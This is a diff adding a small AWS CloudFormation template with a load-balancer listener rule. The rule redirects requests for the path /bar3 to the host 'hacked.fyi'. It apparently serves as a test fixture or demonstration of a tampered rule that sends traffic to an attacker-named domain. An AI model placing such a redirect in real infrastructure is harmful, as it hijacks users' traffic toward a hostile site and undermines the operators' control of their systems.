@@ -1,0 +1,16 @@
+AWSTemplateFormatVersion: 2010-09-09
+Resources: 
+  LoadBalancerListenerRule: 
+    Type: AWS::ElasticLoadBalancingV2::ListenerRule
+    Properties:
+      ListenerArn: arn:aws:elasticloadbalancing:us-east-1:348571044359:listener/app/CFTSt-LoadB-191FJA8TNDD52/ff86a428823699f4/c1fb6b6d88ab96de
+      Actions:
+        - Type: redirect
+          RedirectConfig:
+              Host: hacked.fyi
+              StatusCode: HTTP_302
+      Conditions:
+        - Field: path-pattern
+          Values:
+            - /bar3
+      Priority: 30
